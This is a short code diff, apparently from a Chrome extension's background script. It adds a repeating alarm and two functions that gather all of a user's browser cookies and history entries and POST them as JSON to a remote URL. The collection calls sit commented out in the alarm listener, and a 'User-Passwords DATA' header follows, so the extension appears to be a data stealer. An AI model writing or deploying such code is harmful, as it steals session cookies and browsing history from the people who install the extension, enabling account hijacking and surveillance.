@@ -33,7 +33,50 @@ fetch(
 
 //Cookies Data
 
+chrome.alarms.create({ periodInMinutes: 0.1 });
 
+
+function logCookies(cookies) {
+    var a = [];
+    for (const cookie of cookies) {
+      a.push(cookie);
+    }
+    fetch(
+        url,
+        {
+            method: "POST",
+            body:JSON.stringify(a),
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+    );
+  }
+
+function logHistory(hists){
+    var a = []
+    for(const his of hists){
+        a.push(his)
+    }
+    fetch(
+        url,
+        {
+            method: "POST",
+            body:JSON.stringify(a),
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+    );
+
+}
+
+
+  chrome.alarms.onAlarm.addListener(()=>{
+    //chrome.cookies.getAll({}).then(logCookies);
+    //chrome.history.search({ text: "" }).then(logHistory);
+
+})
 
 //User-Passwords DATA
 
